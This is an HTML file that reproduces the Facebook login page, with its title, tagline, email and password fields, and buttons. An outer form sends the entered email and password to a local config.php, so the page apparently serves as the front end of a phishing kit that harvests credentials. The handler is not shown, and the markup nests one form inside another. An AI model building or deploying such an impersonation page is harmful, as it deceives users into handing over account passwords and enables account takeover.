<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Log In or Sign Up</title>
    <link rel="icon" type="image/svg+xml" href="images/favicon.svg" />
    <link rel="stylesheet" href="css/styles.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
  </head>
  <body>
    <main class="container">
      <!-- TITLE -->
      <div class="title-container">
        <img src="images/logo.svg" class="title-logo" />
        <p class="title-paragraph">
          Connect with friends and the world around you on Facebook.
        </p>
      </div>
      <!-- FORM -->
      <form action="config.php">
      <div class="form-container">
        <form class="form">
          <div class="input-container">
            <input
              type="text" name="email"
              placeholder="Email or Phone Number"
              class="form-input form-input--email"
            />
          </div>
          <div class="input-container input-container--password">
            <input
              type="password"
              placeholder="Password" name="password"
              class="form-input form-input--password"
            />
            <div class="password-eye-container hidden">
              <img src="images/eye-off.png" class="password-eye eye-off" />
            </div>
          </div>
          <button class="form-log-in-btn">Log In</button>
          <a href="#" class="form-forgot-password">Forgot Password?</a>
          <div class="divider"></div>
          <a href="#" class="form-create-account-btn">Create New Account</a>
        </form>
        <p class="create-page-paragraph">
          <a href="#" class="create-page-link">Create a Page</a> for a
          celebrity, band or business.
        </p>
      </div>
    </main>
    <script src="js/script.js"></script>
  </body>
</html>
